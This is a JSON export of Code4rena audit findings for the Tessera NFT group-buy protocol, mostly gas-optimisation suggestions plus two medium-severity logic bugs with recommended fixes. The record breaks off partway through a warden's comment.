      "content": "\nThe Bid struct can be packed tighter\n\n```solidity\nstruct Bid {\n    uint256 bidId;\n    address owner;\n    uint256 price;\n    uint256 quantity;\n}\n```\n[Link to code](https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/lib/MinPriorityQueue.sol#L4-L9)\n\nto\n\n```solidity\nstruct Bid {\n    uint96 bidId;\n    address owner;\n    uint256 price;\n    uint256 quantity;\n}\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tessera",
      "source_link": "https://code4rena.com/reports/2022-12-tessera",
      "github_link": "#g-13-pack-bid-struct",
      "tags": [],
      "finders": []
    },
    {
      "id": "12224",
      "title": "[G-12] Generate merkle tree offchain",
      "impact": "GAS",
      "content": "\nGenerate merkle tree onchain is expensive espically when you want to include a large set of value. Consider generating it offchain a publish the root when creating a new pool.\n\n```solidity\n        bytes32 merkleRoot = (length == 1) ? bytes32(_tokenIds[0]) : _generateRoot(_tokenIds);\n```\n[Link to code](https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/modules/GroupBuy.sol#L71)\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tessera",
      "source_link": "https://code4rena.com/reports/2022-12-tessera",
      "github_link": "#g-12-generate-merkle-tree-offchain",
      "tags": [],
      "finders": []
    },
    {
      "id": "12223",
      "title": "[G-11] Refund contribution and pending balance in the same call",
      "impact": "GAS",
      "content": "\n```solidity\n        // Transfers remaining contribution balance back to caller\n        payable(msg.sender).call{value: contribution}(\"\");\n\n        // Withdraws pending balance of caller if available\n        if (pendingBalances[msg.sender] > 0) withdrawBalance();\n```\n[Link to code](https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/modules/GroupBuy.sol#L264-L268)\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tessera",
      "source_link": "https://code4rena.com/reports/2022-12-tessera",
      "github_link": "#g-11-refund-contribution-and-pending-balance-in-the-same-call",
      "tags": [],
      "finders": []
    },
    {
      "id": "12222",
      "title": "[G-10] Use unchecked when it is safe",
      "impact": "GAS",
      "content": "\nFor example, those dealing with eth value will basically never overflow:\n\n```solidity\n        userContributions[_poolId][msg.sender] += msg.value;\n        totalContributions[_poolId] += msg.value;\n```\n[Link to code](https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/modules/GroupBuy.sol#L115-L116)\n\n```solidity\n            filledQuantities[_poolId] += fillAtAnyPriceQuantity;\n```\n[Link to code](https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/modules/GroupBuy.sol#L128)\n\nAlso those with explicit check before\n\n```solidity\n                lowestBid.quantity -= quantity;\n```\n[Link to code](https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/modules/GroupBuy.sol#L309)\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tessera",
      "source_link": "https://code4rena.com/reports/2022-12-tessera",
      "github_link": "#g-10-use-unchecked-when-it-is-safe",
      "tags": [],
      "finders": []
    },
    {
      "id": "12221",
      "title": "[G-09] Use != 0 instead of > 0 for unsigned integer comparison",
      "impact": "GAS",
      "content": "\n*Instances (5)*:\n```solidity\nFile: src/modules/GroupBuy.sol\n\n124:         if (fillAtAnyPriceQuantity > 0) {\n\n139:         if (filledQuantity > 0) minReservePrices[_poolId] = getMinPrice(_poolId);\n\n268:         if (pendingBalances[msg.sender] > 0) withdrawBalance();\n\n297:         while (quantity > 0) {\n\n```\n[Link to code](https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/modules/GroupBuy.sol)\n\n```solidity\nFile: src/seaport/modules/OptimisticListingSeaport.sol\n\n469:         if (isValidated && !isCancelled && totalFilled > 0 && totalFilled == totalSize) {\n\n```\n[Link to code](https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/seaport/modules/OptimisticListingSeaport.sol)\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tessera",
      "source_link": "https://code4rena.com/reports/2022-12-tessera",
      "github_link": "#g-09-use--0-instead-of--0-for-unsigned-integer-comparison",
      "tags": [],
      "finders": []
    },
    {
      "id": "12220",
      "title": "[G-08] Use shift Right/Left instead of division/multiplication if possible",
      "impact": "GAS",
      "content": "\n*Instances (5)*:\n```solidity\nFile: src/lib/MinPriorityQueue.sol\n\n49:         while (k > 1 && isGreater(self, k / 2, k)) {\n\n50:             exchange(self, k, k / 2);\n\n51:             k = k / 2;\n\n```\n[Link to code](https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/lib/MinPriorityQueue.sol)\n\n```solidity\nFile: src/seaport/modules/OptimisticListingSeaport.sol\n\n395:         uint256 openseaFees = _listingPrice / 40;\n\n396:         uint256 tesseraFees = _listingPrice / 20;\n\n```\n[Link to code](https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/seaport/modules/OptimisticListingSeaport.sol)\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tessera",
      "source_link": "https://code4rena.com/reports/2022-12-tessera",
      "github_link": "#g-08-use-shift-rightleft-instead-of-divisionmultiplication-if-possible",
      "tags": [],
      "finders": []
    },
    {
      "id": "12219",
      "title": "[G-07] `++i` costs less gas than `i++`, especially when it's used in `for`-loops (`--i`/`i--` too)",
      "impact": "GAS",
      "content": "<h2 id=\"g-07-i-costs-less-gas-than-i-especially-when-its-used-in-for-loops---ii---too\" style=\"position:relative;\"><a href=\"#g-07-i-costs-less-gas-than-i-especially-when-its-used-in-for-loops---ii---too\" aria-label=\"g 07 i costs less gas than i especially when its used in for loops   ii   too permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewbox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-07] <code>++i</code> costs less gas than <code>i++</code>, especially when it’s used in <code>for</code>-loops (<code>--i</code>/<code>i--</code> too)</h2>\n<p><em>Saves 5 gas per loop</em></p>\n<p><em>Instances (4)</em>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"77\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">lib</span><span class=\"mtk1\">/</span><span class=\"mtk12\">MinPriorityQueue</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">60</span><span class=\"mtk1\">:                 </span><span class=\"mtk12\">j</span><span class=\"mtk1\">++;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">77</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">insert</span><span class=\"mtk1\">(</span><span class=\"mtk12\">self</span><span class=\"mtk1\">, </span><span class=\"mtk11\">Bid</span><span class=\"mtk1\">(</span><span class=\"mtk12\">self</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nextBidId</span><span class=\"mtk1\">++, </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">price</span><span class=\"mtk1\">, </span><span class=\"mtk12\">quantity</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">98</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">curUserBids</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/lib/MinPriorityQueue.sol\">Link to code</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"78\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">GroupBuy</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">74</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">poolInfo</span><span class=\"mtk1\">[++</span><span class=\"mtk12\">currentId</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">PoolInfo</span><span class=\"mtk1\">(</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/modules/GroupBuy.sol\">Link to code</a></p>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tessera",
      "source_link": "https://code4rena.com/reports/2022-12-tessera",
      "github_link": "#g-07-i-costs-less-gas-than-i-especially-when-its-used-in-for-loops---ii---too",
      "tags": [],
      "finders": []
    },
    {
      "id": "12218",
      "title": "[G-06] Don’t initialize variables with default value",
      "impact": "GAS",
      "content": "<h2 id=\"g-06-dont-initialize-variables-with-default-value\" style=\"position:relative;\"><a href=\"#g-06-dont-initialize-variables-with-default-value\" aria-label=\"g 06 dont initialize variables with default value permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewbox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-06] Don’t initialize variables with default value</h2>\n<p><em>Instances (2)</em>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"75\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">lib</span><span class=\"mtk1\">/</span><span class=\"mtk12\">MinPriorityQueue</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">98</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">curUserBids</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/lib/MinPriorityQueue.sol\">Link to code</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"76\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">seaport</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">OptimisticListingSeaport</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">390</span><span class=\"mtk1\">:             </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">_offer</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/seaport/modules/OptimisticListingSeaport.sol\">Link to code</a></p>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tessera",
      "source_link": "https://code4rena.com/reports/2022-12-tessera",
      "github_link": "#g-06-dont-initialize-variables-with-default-value",
      "tags": [],
      "finders": []
    },
    {
      "id": "12217",
      "title": "[G-05] Use Custom Errors",
      "impact": "GAS",
      "content": "[Source](https://blog.soliditylang.org/2021/04/21/custom-errors/)\n\nInstead of using error strings, to reduce deployment and runtime cost, you should use Custom Errors. This would save both deployment and runtime cost.\n\n*Instances (2)*:\n```solidity\nFile: src/lib/MinPriorityQueue.sol\n\n42:         require(!isEmpty(self), \"nothing to return\");\n\n91:         require(!isEmpty(self), \"nothing to delete\");\n\n```\n[Link to code](https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/lib/MinPriorityQueue.sol)\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tessera",
      "source_link": "https://code4rena.com/reports/2022-12-tessera",
      "github_link": "#g-05-use-custom-errors",
      "tags": [],
      "finders": []
    },
    {
      "id": "12216",
      "title": "[G-04] Use calldata instead of memory for function arguments that do not get mutated",
      "impact": "GAS",
      "content": "Mark data types as `calldata` instead of `memory` where possible. This makes it so that the data is not automatically loaded into memory. If the data passed into the function does not need to be changed (like updating values in an array), it can be passed in as `calldata`. The one exception to this is if the argument must later be passed into another function that takes an argument that specifies `memory` storage.\n\n*Instances (5)*:\n```solidity\nFile: src/modules/GroupBuy.sol\n\n166:         bytes memory _purchaseOrder,\n\n167:         bytes32[] memory _purchaseProof\n\n```\n[Link to code](https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/modules/GroupBuy.sol)\n\n```solidity\nFile: src/punks/protoforms/PunksMarketBuyer.sol\n\n46:     function execute(bytes memory _order) external payable returns (address vault) {\n\n```\n[Link to code](https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/punks/protoforms/PunksMarketBuyer.sol)\n\n```solidity\nFile: src/seaport/targets/SeaportLister.sol\n\n26:     function validateListing(address _consideration, Order[] memory _orders) external {\n\n51:     function cancelListing(address _consideration, OrderComponents[] memory _orders) external {\n\n```\n[Link to code](https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/seaport/targets/SeaportLister.sol)\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tessera",
      "source_link": "https://code4rena.com/reports/2022-12-tessera",
      "github_link": "#g-04-use-calldata-instead-of-memory-for-function-arguments-that-do-not-get-mutated",
      "tags": [],
      "finders": []
    },
    {
      "id": "12215",
      "title": "[G-03] State variables should be cached in stack variables rather than re-reading them from storage",
      "impact": "GAS",
      "content": "The instances below point to the second+ access of a state variable within a function. Caching of a state variable replaces each Gwarmaccess (100 gas) with a much cheaper stack read. Other less obvious fixes/optimizations include having local memory caches of state variable structs, or having local caches of state variable contracts/addresses.\n\n*Saves 100 gas per instance*\n\n*Instances (5)*:\n```solidity\nFile: src/modules/GroupBuy.sol\n\n92:         contribute(currentId, _quantity, _raePrice);\n\n```\n[Link to code](https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/modules/GroupBuy.sol)\n\n```solidity\nFile: src/punks/protoforms/PunksMarketBuyer.sol\n\n37:         proxy = IWrappedPunk(wrapper).proxyInfo(address(this));\n\n64:         IERC721(wrapper).safeTransferFrom(address(this), vault, tokenId);\n\n```\n[Link to code](https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/punks/protoforms/PunksMarketBuyer.sol)\n\n```solidity\nFile: src/seaport/modules/OptimisticListingSeaport.sol\n\n362:             seaportLister,\n\n```\n[Link to code](https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/seaport/modules/OptimisticListingSeaport.sol)\n\n```solidity\nFile: src/seaport/targets/SeaportLister.sol\n\n38:                         IERC1155(token).setApprovalForAll(conduit, true);\n\n```\n[Link to code](https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/seaport/targets/SeaportLister.sol)\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tessera",
      "source_link": "https://code4rena.com/reports/2022-12-tessera",
      "github_link": "#g-03-state-variables-should-be-cached-in-stack-variables-rather-than-re-reading-them-from-storage",
      "tags": [],
      "finders": []
    },
    {
      "id": "12214",
      "title": "[G-02] Cache array length outside of loop",
      "impact": "GAS",
      "content": "If not cached, the solidity compiler will always read the length of the array during each iteration. That is, if it is a storage array, this is an extra sload operation (100 additional extra gas for each iteration except for the first) and if it is a memory array, this is an extra mload operation (3 additional gas for each iteration except for the first).\n\n*Instances (2)*:\n```solidity\nFile: src/lib/MinPriorityQueue.sol\n\n98:         for (uint256 i = 0; i < curUserBids.length; i++) {\n\n```\n[Link to code](https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/lib/MinPriorityQueue.sol)\n\n```solidity\nFile: src/seaport/modules/OptimisticListingSeaport.sol\n\n390:             for (uint256 i = 0; i < _offer.length; ++i) {\n\n```\n[Link to code](https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/seaport/modules/OptimisticListingSeaport.sol)\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tessera",
      "source_link": "https://code4rena.com/reports/2022-12-tessera",
      "github_link": "#g-02-cache-array-length-outside-of-loop",
      "tags": [],
      "finders": []
    },
    {
      "id": "12213",
      "title": "[G-01] Use assembly to check for",
      "impact": "GAS",
      "content": "<h2 id=\"g-01-use-assembly-to-check-for-address0\" style=\"position:relative;\"><a href=\"#g-01-use-assembly-to-check-for-address0\" aria-label=\"g 01 use assembly to check for address0 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewbox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-01] Use assembly to check for <code>address(0)</code></h2>\n<p><em>Saves 6 gas per instance</em></p>\n<p><em>Instances (2)</em>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"64\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">seaport</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">OptimisticListingSeaport</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">106</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">proposedListings</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_vault</span><span class=\"mtk1\">].</span><span class=\"mtk12\">proposer</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">107</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">activeListings</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_vault</span><span class=\"mtk1\">].</span><span class=\"mtk12\">proposer</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/seaport/modules/OptimisticListingSeaport.sol\">Link to code</a></p>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tessera",
      "source_link": "https://code4rena.com/reports/2022-12-tessera",
      "github_link": "#g-01-use-assembly-to-check-for-address0",
      "tags": [],
      "finders": []
    },
    {
      "id": "12212",
      "title": "[M-09] GroupBuys that are completely filled still don’t raise stated target amount",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/modules/GroupBuy.sol#L83\n\n\n## Vulnerability details\n\n## Description\n\ncreatePool() in GroupBuy.sol creates a new contribution pool around an NFT. It specifies a target \\_initialPrice as minimum amount of ETH the NFT will cost, and \\_totalSupply which is the number of Raes to be minted on purchase success.\n\nminBidPrices is calculated from the two numbers. All future bids must be at least minBidPrices. It is assumed that if the totalSupply of Raes is filled up, the group will collect the initialPrice.\n```\n// Calculates minimum bid price based on initial price of NFT and desired total supply\nminBidPrices[currentId] = _initialPrice / _totalSupply;\n```\n\nThe issue is that division rounding error will make minBidPrices too low. Therefore, when all Raes are minted using minBidPrices price:\nminBidPrices[currentId] * \\_totalSupply != \\_initialPrice \n\nTherefore, not enough money has been collected to fund the purchase.\nIt can be assumed that most people will use minBidPrices to drive the price they will choose. Therefore, even after discovering that the Group has not raised enough after filling the supply pool, it will be very hard to get everyone to top up the contribution by a bit. This is because the settled price which is collected from all contributions is minReservePrices, which is always the minimum price deposited.\n\nCode in contribute that updates minReservePrices:\n```\n// Updates minimum reserve price if filled quantity amount is greater than 0\nif (filledQuantity > 0) minReservePrices[_poolId] = getMinPrice(_poolId);\n```\n\n\nThe check in purchase() that we don't charge more than minReservePrices from each contribution:\n```\nif (_price > minReservePrices[_poolId] * filledQuantities[_poolId])\n    revert InvalidPurchase();\n```\n\nWe can see an important contract functionality is not working as expected which will impair NFT purchases.\n\n## Impact\n\nGroupBuys that are completely filled still don't raise stated target amount\n\n## Tools Used\n\nManual audit\n\n## Recommended Mitigation Steps\n\nRound the minBidPrices up, rather than down. It will ensure enough funds are collected.",
      "summary": "\nThis bug report is about the createPool() function in GroupBuy.sol, which creates a contribution pool around an NFT. The issue is that when the totalSupply of Raes is filled up, the group will not collect the initialPrice due to division rounding error making minBidPrices too low. This means that even after filling the supply pool, not enough money has been collected to fund the purchase. As a result, an important contract functionality is not working as expected which will impair NFT purchases.\n\nThe impact of this issue is that GroupBuys that are completely filled still don't raise the stated target amount. The bug was discovered through manual audit.\n\nThe recommended mitigation step for this issue is to round the minBidPrices up, rather than down. This will ensure enough funds are collected.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tessera",
      "source_link": "https://code4rena.com/reports/2022-12-tessera",
      "github_link": "https://github.com/code-423n4/2022-12-tessera-findings/issues/49",
      "tags": [],
      "finders": [
        "Trust",
        "gzeon"
      ]
    },
    {
      "id": "12211",
      "title": "[M-08]  Earlier bidders get cut out of future NFT holdings by bidders specifying the same price.",
      "impact": "MEDIUM",
      "content": "\nIn GroupBuy module, users can call contribute to get a piece of the NFT pie. There are two stages in transforming the msg.value to holdings in the NFT. \n\n1.  filling at any price(supply is not yet saturated)\n\n<!---->\n\n    uint256 fillAtAnyPriceQuantity = remainingSupply < _quantity ? remainingSupply : _quantity;\n    // Checks if quantity amount being filled is greater than 0\n    if (fillAtAnyPriceQuantity > 0) {\n        // Inserts bid into end of queue\n        bidPriorityQueues[_poolId].insert(msg.sender, _price, fillAtAnyPriceQuantity);\n        // Increments total amount of filled quantities\n        filledQuantities[_poolId] += fillAtAnyPriceQuantity;\n    }\n\n2.  Trim out lower price offers to make room for current higher offer.\n\n<!---->\n\n    // Calculates unfilled quantity amount based on desired quantity and actual filled quantity amount\n    uint256 unfilledQuantity = _quantity - fillAtAnyPriceQuantity;\n    // Processes bids in queue to recalculate unfilled quantity amount\n    unfilledQuantity = processBidsInQueue(_poolId, unfilledQuantity, _price);\n\nThe while loop in `processBidsInQueue` will keep removing existing bids with lower price and create new queue entries for currently processed bid. When it reached a bid with a higher price than msg.sender's price, it will break:\n\n    while (quantity > 0) {\n        // Retrieves lowest bid in queue\n        Bid storage lowestBid = bidPriorityQueues[_poolId].getMin();\n        // Breaks out of while loop if given price is less than than lowest bid price\n        if (_price < lowestBid.price) {\n            break;\n        }\n\nThe issue is that when `_price  == lowestBid.price`, we don't break and current bid will kick out older bid, as can be seen here:\n\n    // Decrements given quantity amount from lowest bid quantity\n    lowestBid.quantity -= quantity;\n    // Calculates partial contribution of bid by quantity amount and price\n    uint256 contribution = quantity * lowestBid.price;\n    // Decrements partial contribution amount of lowest bid from total and user contributions\n    totalContributions[_poolId] -= contribution;\n    userContributions[_poolId][lowestBid.owner] -= contribution;\n    // Increments pending balance of lowest bid owner\n    pendingBalances[lowestBid.owner] += contribution;\n    // Inserts new bid with given quantity amount into proper position of queue\n    bidPriorityQueues[_poolId].insert(msg.sender, _price, quantity);\n\nThe described behavior goes against what the docs [describe](https://github.com/code-423n4/2022-12-tessera#step-3-other-users-deposit-funds-to-pool-filtering) will happen when two equal priced bids collide.\n\n### Impact\n\nEarlier bidders get cut out of future NFT holdings by bidders specifying the same price.\n\n### Recommended Mitigation Steps\n\nChange the < to <= in the if condition:\n\n    if (_price <= lowestBid.price) {\n        break;\n    }\n\n\n**[IllIllI (warden) commented](https://github.com/code-423n4/2022-12-tessera-findings/issues/45#issuecomment-1362646074):**\n > @HickupHH3 @Trust the final code block in this submission comes from [here](https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/modules/GroupBuy.sol#L308-L320), which falls under the case where the price is the same and the quantity is different. The readme states `If two users place bids at the same price but with different quantities, the queue will pull from the bid with a higher quantity first`, and as the submission shows, it's pulling from the higher quantity first - 